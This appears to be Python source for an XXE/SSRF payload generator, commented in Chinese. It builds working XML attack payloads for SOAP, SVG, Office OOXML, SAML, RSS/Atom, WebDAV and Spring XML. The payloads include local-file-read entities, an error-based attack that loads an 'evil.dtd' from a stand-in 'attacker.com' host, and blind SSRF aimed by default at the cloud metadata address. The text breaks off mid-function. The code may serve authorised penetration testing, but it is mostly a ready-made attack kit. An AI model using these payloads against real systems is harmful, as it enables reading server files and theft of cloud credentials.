#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
增强版 XXE/SSRF Payload 生成工具
================================

新增场景覆盖:
    1. SOAP WebService
    2. SVG 上传/转换
    3. Office OOXML 文档: docx/xlsx/pptx
    4. SAML Response
    5. RSS / Atom Feed
    6. WebDAV / CalDAV / CardDAV
    7. Spring XML 配置

基础功能:
    - Local DTD Reuse
    - Error-Based XXE
    - Blind SSRF
    - XInclude
    - Schema Location SSRF
    - 恶意 DTD HTTP Server
    - Payload 批量保存
    - JSON 输出

使用示例:
    python xxe_scanner_enhanced.py --list

    python xxe_scanner_enhanced.py --mode soap --target-file /etc/hostname
    python xxe_scanner_enhanced.py --mode svg --target-file /etc/hostname
    python xxe_scanner_enhanced.py --mode saml --target-file /etc/hostname
    python xxe_scanner_enhanced.py --mode office --target-file /etc/hostname -o ./payloads
    python xxe_scanner_enhanced.py --mode scenario_auto -o ./scenario_payloads

    python xxe_scanner_enhanced.py --mode blind_ssrf --ssrf-url http://127.0.0.1:8080/test
    python xxe_scanner_enhanced.py --serve --port 8080 --target-file /etc/hostname

安全说明:
    本工具仅用于授权安全测试、靶场环境、内部合规验证。
"""

import argparse
import base64
import json
import os
import sys
import textwrap
import time
import zipfile
from typing import Dict, List, Optional
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
from urllib.parse import quote


# ============================================================================
# 第一部分：本地 DTD 数据库
# ============================================================================

LOCAL_DTD_DATABASE: List[Dict] = [
    {
        "path": "file:///usr/share/yelp/dtd/docbookx.dtd",
        "entity_name": "ISOamso",
        "os": "linux",
        "platform": ["java", "dotnet"],
        "description": "GNOME Yelp DocBook DTD，Ubuntu/Fedora 常见",
        "confidence": "high"
    },
    {
        "path": "file:///usr/share/xml/fontconfig/fonts.dtd",
        "entity_name": "expr",
        "os": "linux",
        "platform": ["java", "dotnet"],
        "description": "Fontconfig 字体配置 DTD",
        "confidence": "medium"
    },
    {
        "path": "file:///usr/share/sgml/docbook/xml-dtd-4.1.2/docbookx.dtd",
        "entity_name": "ISOamso",
        "os": "linux",
        "platform": ["java", "dotnet"],
        "description": "DocBook XML DTD，RHEL/CentOS 常见",
        "confidence": "medium"
    },
    {
        "path": "file:///usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd",
        "entity_name": "ISOamso",
        "os": "linux",
        "platform": ["java", "dotnet"],
        "description": "DocBook XML DTD 4.5，Debian/Ubuntu 常见",
        "confidence": "medium"
    },
    {
        "path": "jar:file:///usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd",
        "entity_name": "URI",
        "os": "linux",
        "platform": ["java"],
        "description": "Tomcat JSP API DTD，Docker Tomcat 常见",
        "confidence": "high"
    },
    {
        "path": "jar:file:///opt/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd",
        "entity_name": "URI",
        "os": "linux",
        "platform": ["java"],
        "description": "Tomcat JSP API DTD，手动安装路径",
        "confidence": "medium"
    },
    {
        "path": "file:///C:/Windows/System32/wbem/xml/cim20.dtd",
        "entity_name": "CIMName",
        "os": "windows",
        "platform": ["java", "dotnet"],
        "description": "Windows WMI CIM DTD",
        "confidence": "high"
    },
    {
        "path": "file:///C:/Windows/System32/wbem/xml/wmi20.dtd",
        "entity_name": "CIMName",
        "os": "windows",
        "platform": ["java", "dotnet"],
        "description": "Windows WMI DTD",
        "confidence": "high"
    },
]


# ============================================================================
# 第二部分：辅助函数
# ============================================================================

def normalize_file_uri(target_file: str) -> str:
    """
    将用户输入的文件路径转为 file URI。

    Linux:
        /etc/hostname -> file:///etc/hostname

    Windows:
        C:/Windows/win.ini -> file:///C:/Windows/win.ini
    """
    if target_file.startswith("file://"):
        return target_file

    normalized = target_file.replace("\\", "/")

    if len(normalized) >= 2 and normalized[1] == ":":
        return f"file:///{normalized}"

    if normalized.startswith("/"):
        return f"file://{normalized}"

    return f"file:///{normalized}"


def safe_filename(name: str) -> str:
    """简单清洗文件名。"""
    allowed = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-"
    return "".join(c if c in allowed else "_" for c in name)


def now_string() -> str:
    return time.strftime("%Y-%m-%d %H:%M:%S")


def ensure_dir(path: str):
    os.makedirs(path, exist_ok=True)


# ============================================================================
# 第三部分：Payload 生成器
# ============================================================================

class XXEPayloadGenerator:
    """
    增强版 XXE Payload 生成器。

    支持基础 XXE 技术和更多真实业务场景:
        - SOAP
        - SVG
        - Office OOXML
        - SAML
        - RSS/Atom
        - WebDAV
        - Spring XML
    """

    def __init__(
        self,
        target_file: str = "/etc/hostname",
        attacker_url: str = "http://attacker.com",
        ssrf_url: str = "http://169.254.169.254/latest/meta-data/",
        target_os: str = "linux",
        platform: str = "java"
    ):
        self.target_file = target_file
        self.target_file_uri = normalize_file_uri(target_file)
        self.attacker_url = attacker_url.rstrip("/")
        self.ssrf_url = ssrf_url
        self.target_os = target_os
        self.platform = platform

    # ----------------------------------------------------------------------
    # 基础 XML Payload
    # ----------------------------------------------------------------------

    def generate_basic_file_entity_payload(self) -> Dict:
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "{self.target_file_uri}">
]>
<root>&xxe;</root>'''

        return {
            "name": "basic_file_entity",
            "payload": payload,
            "technique": "Basic External General Entity",
            "description": "最基础的外部通用实体文件读取测试。",
            "requirements": [
                "解析器允许 DOCTYPE",
                "解析器允许外部通用实体",
                "应用会回显实体内容"
            ],
            "file_ext": ".xml"
        }

    def generate_local_dtd_payload(self, dtd_entry: Optional[Dict] = None) -> List[Dict]:
        payloads = []

        if dtd_entry:
            candidates = [dtd_entry]
        else:
            candidates = [
                d for d in LOCAL_DTD_DATABASE
                if d["os"] == self.target_os
                and self.platform in d["platform"]
                and d.get("entity_name")
            ]

        for dtd in candidates:
            malicious_entity_value = (
                "\n"
                f'    <!ENTITY &#x25; xxe_file SYSTEM "{self.target_file_uri}">\n'
                f'    <!ENTITY &#x25; xxe_eval "<!ENTITY &#x26;#x25; xxe_error SYSTEM '
                f'&#x27;file:///nonexistent_xxe_path/&#x25;xxe_file;&#x27;>">\n'
                f"    &#x25;xxe_eval;\n"
                f"    &#x25;xxe_error;\n"
                f"  "
            )

            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "{dtd["path"]}">
  <!ENTITY % {dtd["entity_name"]} '{malicious_entity_value}'>
  %local_dtd;
]>
<foo>local_dtd_reuse_test</foo>'''

            payloads.append({
                "name": f"local_dtd_reuse_{dtd['entity_name']}",
                "payload": payload,
                "technique": "Local DTD Reuse",
                "description": dtd["description"],
                "confidence": dtd["confidence"],
                "dtd_path": dtd["path"],
                "requirements": [
                    "目标系统存在对应本地 DTD",
                    "解析器允许加载本地 file:// DTD",
                    "应用回显 XML 解析错误"
                ],
                "file_ext": ".xml"
            })

        return payloads

    def generate_error_based_payload(self) -> Dict:
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{self.attacker_url}/evil.dtd">
  %xxe;
]>
<foo>error_based_xxe_test</foo>'''

        evil_dtd = self._generate_evil_dtd()

        return {
            "name": "error_based_external_dtd",
            "payload": payload,
            "evil_dtd": evil_dtd,
            "technique": "Error-Based XXE via External DTD",
            "description": "通过远程 DTD 构造错误路径，依赖错误信息泄露。",
            "requirements": [
                "目标允许访问攻击者 DTD 服务器",
                "解析器允许外部 DTD",
                "应用回显 XML 解析错误"
            ],
            "file_ext": ".xml"
        }

    def _generate_evil_dtd(self) -> str:
        return (
            f'<!ENTITY % file SYSTEM "{self.target_file_uri}">\n'
            f'<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
            f'\'file:///nonexistent_xxe_error/&#x25;file;\'>">\n'
            f'%eval;\n'
            f'%error;\n'
        )

    def generate_blind_ssrf_payload(self) -> List[Dict]:
        payloads = []

        payloads.append({
            "name": "blind_ssrf_parameter_entity",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % ssrf SYSTEM "{self.ssrf_url}">
  %ssrf;
]>
<foo>blind_ssrf_parameter_entity</foo>''',
            "technique": "Blind SSRF via Parameter Entity",
            "description": "通过参数实体 SYSTEM URL 触发 SSRF。",
            "file_ext": ".xml"
        })

        payloads.append({
            "name": "blind_ssrf_general_entity",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "{self.ssrf_url}">
]>
<foo>&ssrf;</foo>''',
            "technique": "Blind SSRF via General Entity",
            "description": "通过通用实体触发 SSRF，需在 XML body 中引用实体。",
            "file_ext": ".xml"
        })

        payloads.append({
            "name": "blind_ssrf_doctype_system",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "{self.ssrf_url}">
<foo>blind_ssrf_doctype_system</foo>''',
            "technique": "Blind SSRF via DOCTYPE SYSTEM",
            "description": "DOCTYPE SYSTEM 标识符触发远程请求。",
            "file_ext": ".xml"
        })

        dns_host = self.attacker_url.replace("http://", "").replace("https://", "").strip("/")
        payloads.append({
            "name": "blind_ssrf_dns_canary",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dns_probe SYSTEM "http://xxe-confirm.{dns_host}/probe">
  %dns_probe;
]>
<foo>dns_canary</foo>''',
            "technique": "DNS Canary",
            "description": "配合 DNS 记录平台确认解析器是否发起请求。",
            "file_ext": ".xml"
        })

        for p in payloads:
            p["requirements"] = [
                "解析器允许处理 DTD",
                "解析器允许访问外部 URL"
            ]

        return payloads

    def generate_xinclude_payload(self) -> List[Dict]:
        payloads = []

        payloads.append({
            "name": "xinclude_file_read",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="{self.target_file_uri}"/>
</foo>''',
            "injection_fragment": (
                f'<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" '
                f'parse="text" href="{self.target_file_uri}"/>'
            ),
            "technique": "XInclude File Read",
            "description": "通过 XInclude 读取本地文件，不依赖 DOCTYPE。",
            "file_ext": ".xml"
        })

        payloads.append({
            "name": "xinclude_ssrf",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="{self.ssrf_url}"/>
</foo>''',
            "injection_fragment": (
                f'<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" '
                f'parse="text" href="{self.ssrf_url}"/>'
            ),
            "technique": "XInclude SSRF",
            "description": "通过 XInclude 触发远程资源加载。",
            "file_ext": ".xml"
        })

        for p in payloads:
            p["requirements"] = [
                "应用启用 XInclude 处理",
                "Java 需要 setXIncludeAware(true)",
                ".NET 默认通常不启用"
            ]

        return payloads

    def generate_schema_ssrf_payload(self) -> List[Dict]:
        payloads = []

        payloads.append({
            "name": "schema_ssrf_no_namespace",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<foo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
     xsi:noNamespaceSchemaLocation="{self.ssrf_url}">
  schema_ssrf_no_namespace
</foo>''',
            "technique": "Schema Location SSRF",
            "description": "通过 xsi:noNamespaceSchemaLocation 触发 XSD 加载。",
            "file_ext": ".xml"
        })

        payloads.append({
            "name": "schema_ssrf_with_namespace",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<foo xmlns="http://example.com/test"
     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
     xsi:schemaLocation="http://example.com/test {self.ssrf_url}">
  schema_ssrf_with_namespace
</foo>''',
            "technique": "Schema Location SSRF",
            "description": "通过 xsi:schemaLocation 触发 XSD 加载。",
            "file_ext": ".xml"
        })

        for p in payloads:
            p["requirements"] = [
                "应用启用 XML Schema 验证",
                "解析器允许远程加载 XSD"
            ]

        return payloads

    # ----------------------------------------------------------------------
    # 新增场景 1：SOAP
    # ----------------------------------------------------------------------

    def generate_soap_payloads(self) -> List[Dict]:
        """
        SOAP WebService 场景。

        覆盖:
            - SOAP 1.1
            - SOAP 1.2
            - SOAP Body 中的 XInclude 注入
            - SOAP SchemaLocation SSRF
        """
        payloads = []

        soap11 = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soapenv:Envelope [
  <!ENTITY xxe SYSTEM "{self.target_file_uri}">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/>
  <soapenv:Body>
    <m:getInfo xmlns:m="http://example.com/soap">
      <m:value>&xxe;</m:value>
    </m:getInfo>
  </soapenv:Body>
</soapenv:Envelope>'''

        payloads.append({
            "name": "soap11_xxe_file_entity",
            "payload": soap11,
            "technique": "SOAP 1.1 XXE",
            "description": "SOAP 1.1 WebService 中的外部实体文件读取测试。",
            "content_type": "text/xml; charset=utf-8",
            "headers": {
                "Content-Type": "text/xml; charset=utf-8",
                "SOAPAction": "\"getInfo\""
            },
            "file_ext": ".xml",
            "requirements": [
                "SOAP 服务端使用 XML 解析器处理请求",
                "解析器允许 DOCTYPE 和外部实体"
            ]
        })

        soap12 = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE env:Envelope [
  <!ENTITY xxe SYSTEM "{self.target_file_uri}">
]>
<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope">
  <env:Header/>
  <env:Body>
    <m:getInfo xmlns:m="http://example.com/soap12">
      <m:value>&xxe;</m:value>
    </m:getInfo>
  </env:Body>
</env:Envelope>'''

        payloads.append({
            "name": "soap12_xxe_file_entity",
            "payload": soap12,
            "technique": "SOAP 1.2 XXE",
            "description": "SOAP 1.2 WebService 中的外部实体文件读取测试。",
            "content_type": "application/soap+xml; charset=utf-8",
            "headers": {
                "Content-Type": "application/soap+xml; charset=utf-8"
            },
            "file_ext": ".xml",
            "requirements": [
                "SOAP 1.2 服务端使用 XML 解析器处理请求",
                "解析器允许 DOCTYPE 和外部实体"
            ]
        })

        soap_xinclude = f'''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:xi="http://www.w3.org/2001/XInclude">
  <soapenv:Header/>
  <soapenv:Body>
    <m:getInfo xmlns:m="http://example.com/soap">
      <m:value>
        <xi:include parse="text" href="{self.target_file_uri}"/>
      </m:value>
    </m:getInfo>
  </soapenv:Body>
</soapenv:Envelope>'''

        payloads.append({
            "name": "soap_body_xinclude_file_read",
            "payload": soap_xinclude,
            "technique": "SOAP Body XInclude",
            "description": "在 SOAP Body 中注入 XInclude，不依赖 DOCTYPE。",
            "content_type": "text/xml; charset=utf-8",
            "headers": {
                "Content-Type": "text/xml; charset=utf-8"
            },
            "file_ext": ".xml",
            "requirements": [
                "服务端启用 XInclude 处理",
                "用户可控制 SOAP Body 内容"
            ]
        })

        soap_schema = f'''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                  xsi:schemaLocation="http://schemas.xmlsoap.org/soap/envelope/ {self.ssrf_url}">
  <soapenv:Header/>
  <soapenv:Body>
    <test>schema_location_ssrf</test>
  </soapenv:Body>
</soapenv:Envelope>'''

        payloads.append({
            "name": "soap_schema_location_ssrf",
            "payload": soap_schema,
            "technique": "SOAP SchemaLocation SSRF",
            "description": "SOAP 根节点上使用 xsi:schemaLocation 触发远程 XSD 加载。",
            "content_type": "text/xml; charset=utf-8",
            "headers": {
                "Content-Type": "text/xml; charset=utf-8"
            },
            "file_ext": ".xml",
            "requirements": [
                "服务端启用 Schema 验证",
                "允许远程加载 XSD"
            ]
        })

        return payloads

    # ----------------------------------------------------------------------
    # 新增场景 2：SVG
    # ----------------------------------------------------------------------

    def generate_svg_payloads(self) -> List[Dict]:
        """
        SVG 场景。

        适用于:
            - SVG 上传
            - SVG 转 PNG/JPEG
            - HTML 转 PDF
            - 文档预览
            - 图片处理服务
        """
        payloads = []

        svg_entity = f'''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "{self.target_file_uri}">
]>
<svg width="600" height="160" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="40" font-size="16">&xxe;</text>
</svg>'''

        payloads.append({
            "name": "svg_xxe_text_file_entity",
            "payload": svg_entity,
            "technique": "SVG XXE",
            "description": "SVG 文本节点中引用外部实体。",
            "content_type": "image/svg+xml",
            "file_ext": ".svg",
            "requirements": [
                "服务端按 XML 解析 SVG",
                "解析器允许 DOCTYPE 和外部实体",
                "渲染或转换结果可能回显文本"
            ]
        })

        svg_ssrf_image = f'''<?xml version="1.0" encoding="UTF-8"?>
<svg width="600" height="160" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image x="10" y="10" width="100" height="100" xlink:href="{self.ssrf_url}"/>
  <text x="10" y="140">svg external resource ssrf test</text>
</svg>'''

        payloads.append({
            "name": "svg_external_image_ssrf",
            "payload": svg_ssrf_image,
            "technique": "SVG External Resource SSRF",
            "description": "SVG image 外链资源触发 SSRF，很多渲染器会请求该 URL。",
            "content_type": "image/svg+xml",
            "file_ext": ".svg",
            "requirements": [
                "服务端 SVG 渲染器会加载外部资源",
                "网络访问未被限制"
            ]
        })

        svg_xinclude = f'''<?xml version="1.0" encoding="UTF-8"?>
<svg width="600" height="160"
     xmlns="http://www.w3.org/2000/svg"
     xmlns:xi="http://www.w3.org/2001/XInclude">
  <text x="10" y="40">Before</text>
  <xi:include parse="text" href="{self.target_file_uri}"/>
  <text x="10" y="80">After</text>
</svg>'''

        payloads.append({
            "name": "svg_xinclude_file_read",
            "payload": svg_xinclude,
            "technique": "SVG XInclude",
            "description": "在 SVG 中使用 XInclude 读取文件。",
            "content_type": "image/svg+xml",
            "file_ext": ".svg",
            "requirements": [
                "SVG XML 解析器启用 XInclude"
            ]
        })

        return payloads

    # ----------------------------------------------------------------------
    # 新增场景 3：Office OOXML
    # ----------------------------------------------------------------------

    def generate_office_payloads(self) -> List[Dict]:
        """
        Office OOXML 场景。

        生成:
            - docx
            - xlsx
            - pptx

        实现方式:
            将 XML Payload 放入 customXml/item1.xml 中。
            很多文档预览、DLP、杀毒网关、在线转换服务会解析 OOXML 内部 XML。
        """
        inner_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "{self.target_file_uri}">
]>
<root>
  <value>&xxe;</value>
</root>'''

        inner_ssrf_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % ssrf SYSTEM "{self.ssrf_url}">
  %ssrf;
]>
<root>office_ooxml_ssrf</root>'''

        return [
            {
                "name": "office_docx_customxml_xxe",
                "payload": inner_xml,
                "technique": "OOXML customXml XXE",
                "description": "生成 docx，customXml/item1.xml 内包含 XXE Payload。",
                "file_ext": ".docx",
                "ooxml_kind": "docx",
                "requirements": [
                    "目标系统解析 OOXML 内部 customXml",
                    "内部 XML 解析器允许 DOCTYPE 和外部实体"
                ]
            },
            {
                "name": "office_xlsx_customxml_xxe",
                "payload": inner_xml,
                "technique": "OOXML customXml XXE",
                "description": "生成 xlsx，customXml/item1.xml 内包含 XXE Payload。",
                "file_ext": ".xlsx",
                "ooxml_kind": "xlsx",
                "requirements": [
                    "目标系统解析 OOXML 内部 customXml",
                    "内部 XML 解析器允许 DOCTYPE 和外部实体"
                ]
            },
            {
                "name": "office_pptx_customxml_xxe",
                "payload": inner_xml,
                "technique": "OOXML customXml XXE",
                "description": "生成 pptx，customXml/item1.xml 内包含 XXE Payload。",
                "file_ext": ".pptx",
                "ooxml_kind": "pptx",
                "requirements": [
                    "目标系统解析 OOXML 内部 customXml",
                    "内部 XML 解析器允许 DOCTYPE 和外部实体"
                ]
            },
            {
                "name": "office_docx_customxml_ssrf",
                "payload": inner_ssrf_xml,
                "technique": "OOXML customXml SSRF",
                "description": "生成 docx，customXml/item1.xml 内包含 Blind SSRF Payload。",
                "file_ext": ".docx",
                "ooxml_kind": "docx",
                "requirements": [
                    "目标系统解析 OOXML 内部 customXml",
                    "解析器允许外部 DTD/参数实体"
                ]
            },
        ]

    # ----------------------------------------------------------------------
    # 新增场景 4：SAML
    # ----------------------------------------------------------------------

    def generate_saml_payloads(self) -> List[Dict]:
        """
        SAML 场景。

        适用于:
            - SSO 登录
            - SAML Response
            - 身份认证网关
            - IdP/SP 联调接口

        注意:
            真实 SAML 通常有签名校验。
            此处主要用于测试解析器是否在签名前/校验前解析 XML。
        """
        saml_response = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "{self.target_file_uri}">
]>
<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_xxe_test"
    Version="2.0"
    IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>xxe-test-idp</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_assertion_xxe" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>xxe-test-idp</saml:Issuer>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>'''

        encoded = base64.b64encode(saml_response.encode("utf-8")).decode("ascii")
        form_body = f"SAMLResponse={quote(encoded)}"

        saml_schema = f'''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="urn:oasis:names:tc:SAML:2.0:protocol {self.ssrf_url}"
    ID="_schema_ssrf"
    Version="2.0"
    IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>schema-ssrf-test</saml:Issuer>
</samlp:Response>'''

        return [
            {
                "name": "saml_response_xxe_file_entity",
                "payload": saml_response,
                "technique": "SAML XXE",
                "description": "SAML Response 中使用外部实体。",
                "content_type": "application/xml",
                "file_ext": ".xml",
                "requirements": [
                    "SAML 解析器允许 DOCTYPE",
                    "应用在签名校验前解析实体或错误处理不当"
                ]
            },
            {
                "name": "saml_response_base64_post_body",
                "payload": form_body,
                "raw_xml": saml_response,
                "base64_saml": encoded,
                "technique": "SAML Base64 POST Binding",
                "description": "SAMLResponse 表单参数形式，已 Base64 和 URL 编码。",
                "content_type": "application/x-www-form-urlencoded",
                "file_ext": ".txt",
                "requirements": [
                    "目标使用 SAML HTTP-POST Binding",
                    "应用接收 SAMLResponse 参数"
                ]
            },
            {
                "name": "saml_schema_location_ssrf",
                "payload": saml_schema,
                "technique": "SAML SchemaLocation SSRF",
                "description": "SAML 根节点上使用 xsi:schemaLocation 触发 XSD 加载。",
                "content_type": "application/xml",
                "file_ext": ".xml",
                "requirements": [
                    "SAML 处理链启用 Schema 验证",
                    "允许远程加载 XSD"
                ]
            }
        ]

    # ----------------------------------------------------------------------
    # 新增场景 5：RSS / Atom
    # ----------------------------------------------------------------------

    def generate_rss_atom_payloads(self) -> List[Dict]:
        """
        RSS/Atom Feed 场景。

        适用于:
            - Feed 订阅
            - 内容聚合平台
            - 新闻采集
            - 博客导入
            - CMS 外部 Feed 解析
        """
        rss = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "{self.target_file_uri}">
]>
<rss version="2.0">
  <channel>
    <title>XXE RSS Test</title>
    <link>http://example.com/</link>
    <description>&xxe;</description>
    <item>
      <title>Item</title>
      <description>&xxe;</description>
    </item>
  </channel>
</rss>'''

        atom = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE feed [
  <!ENTITY xxe SYSTEM "{self.target_file_uri}">
]>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XXE Atom Test</title>
  <id>urn:xxe:test</id>
  <updated>2024-01-01T00:00:00Z</updated>
  <entry>
    <title>Entry</title>
    <id>urn:xxe:entry</id>
    <updated>2024-01-01T00:00:00Z</updated>
    <content>&xxe;</content>
  </entry>
</feed>'''

        rss_ssrf = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
  <!ENTITY % ssrf SYSTEM "{self.ssrf_url}">
  %ssrf;
]>
<rss version="2.0">
  <channel>
    <title>RSS SSRF Test</title>
    <description>blind ssrf</description>
  </channel>
</rss>'''

        return [
            {
                "name": "rss2_xxe_file_entity",
                "payload": rss,
                "technique": "RSS XXE",
                "description": "RSS 2.0 Feed 中使用外部实体。",
                "content_type": "application/rss+xml",
                "file_ext": ".xml",
                "requirements": [
                    "目标解析外部 RSS Feed",
                    "Feed 解析器允许 DOCTYPE 和外部实体"
                ]
            },
            {
                "name": "atom_xxe_file_entity",
                "payload": atom,
                "technique": "Atom XXE",
                "description": "Atom Feed 中使用外部实体。",
                "content_type": "application/atom+xml",
                "file_ext": ".xml",
                "requirements": [
                    "目标解析 Atom Feed",
                    "Feed 解析器允许 DOCTYPE 和外部实体"
                ]
            },
            {
                "name": "rss2_blind_ssrf_parameter_entity",
                "payload": rss_ssrf,
                "technique": "RSS Blind SSRF",
                "description": "RSS Feed 解析时通过参数实体触发 SSRF。",
                "content_type": "application/rss+xml",
                "file_ext": ".xml",
                "requirements": [
                    "Feed 解析器允许参数实体",
                    "目标允许访问远程 URL"
                ]
            }
        ]

    # ----------------------------------------------------------------------
    # 新增场景 6：WebDAV / CalDAV / CardDAV
    # ----------------------------------------------------------------------

    def generate_webdav_payloads(self) -> List[Dict]:
        """
        WebDAV 场景。

        适用于:
            - PROPFIND
            - REPORT
            - CalDAV
            - CardDAV
            - 云盘/文件管理系统
        """
        propfind = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE d:propfind [
  <!ENTITY xxe SYSTEM "{self.target_file_uri}">
]>
<d:propfind xmlns:d="DAV:">
  <d:prop>
    <d:displayname>&xxe;</d:displayname>
  </d:prop>
</d:propfind>'''

        report = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE c:calendar-query [
  <!ENTITY xxe SYSTEM "{self.target_file_uri}">
]>
<c:calendar-query xmlns:d="DAV:" xmlns:c="urn:ietf:params:xml:ns:caldav">
  <d:prop>
    <d:displayname>&xxe;</d:displayname>
  </d:prop>
  <c:filter>
    <c:comp-filter name="VCALENDAR"/>
  </c:filter>
</c:calendar-query>'''

        propfind_ssrf = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE d:propfind [
  <!ENTITY % ssrf SYSTEM "{self.ssrf_url}">
  %ssrf;
]>
<d:propfind xmlns:d="DAV:">
  <d:allprop/>
</d:propfind>'''

        return [
            {
                "name": "webdav_propfind_xxe_file_entity",
                "payload": propfind,
                "technique": "WebDAV PROPFIND XXE",
                "description": "WebDAV PROPFIND 请求体中的 XXE。",
                "method": "PROPFIND",
                "content_type": "application/xml; charset=utf-8",
                "headers": {
                    "Content-Type": "application/xml; charset=utf-8",
                    "Depth": "1"
                },
                "file_ext": ".xml",
                "requirements": [
                    "目标支持 WebDAV PROPFIND",
                    "服务器端 XML 解析器允许外部实体"
                ]
            },
            {
                "name": "caldav_report_xxe_file_entity",
                "payload": report,
                "technique": "CalDAV REPORT XXE",
                "description": "CalDAV REPORT 请求体中的 XXE。",
                "method": "REPORT",
                "content_type": "application/xml; charset=utf-8",
                "headers": {
                    "Content-Type": "application/xml; charset=utf-8",
                    "Depth": "1"
                },
                "file_ext": ".xml",
                "requirements": [
                    "目标支持 CalDAV REPORT",
                    "服务器端 XML 解析器允许外部实体"
                ]
            },
            {
                "name": "webdav_propfind_blind_ssrf",
                "payload": propfind_ssrf,
                "technique": "WebDAV Blind SSRF",
                "description": "WebDAV PROPFIND 中通过参数实体触发 SSRF。",
                "method": "PROPFIND",
                "content_type": "application/xml; charset=utf-8",
                "headers": {
                    "Content-Type": "application/xml; charset=utf-8",
                    "Depth": "1"
                },
                "file_ext": ".xml",
                "requirements": [
                    "目标支持 WebDAV",
                    "XML 解析器允许参数实体和远程加载"
                ]
            }
        ]

    # ----------------------------------------------------------------------
    # 新增场景 7：Spring XML 配置
    # ----------------------------------------------------------------------

    def generate_spring_xml_payloads(self) -> List[Dict]:
        """
        Spring XML 配置场景。

        适用于:
            - 用户上传 Spring XML 配置
            - 老系统动态加载 XML Bean 配置
            - 插件系统读取 XML 配置
        """
        spring_basic = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE beans [
  <!ENTITY xxe SYSTEM "{self.target_file_uri}">
]>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <bean id="xxeTest" class="java.lang.String">
    <constructor-arg value="&xxe;"/>
  </bean>
</beans>'''

        spring_schema_ssrf = f'''<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
         http://www.springframework.org/schema/beans {self.ssrf_url}
       ">
  <bean id="schemaTest" class="java.lang.String">
    <constructor-arg value="schema_ssrf"/>
  </bean>
</beans>'''

        spring_xinclude = f'''<?xml version="1.0" encoding="UTF-8"?>
